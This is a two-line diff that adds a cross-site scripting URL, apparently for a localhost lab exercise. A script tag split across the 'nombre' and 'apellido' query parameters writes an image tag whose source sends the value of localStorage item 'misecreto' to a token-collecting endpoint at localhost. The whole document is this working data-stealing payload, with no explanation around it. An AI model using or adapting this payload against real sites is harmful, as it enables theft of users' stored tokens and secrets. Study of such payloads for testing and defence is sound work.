@@ -1,0 +1,2 @@
+http://localhost/xss/?nombre=<script>void("&apellido=");document.write("<img
+src='http://localhost/token/?token="%2BlocalStorage.getItem('misecreto')%2B"'>");</script>
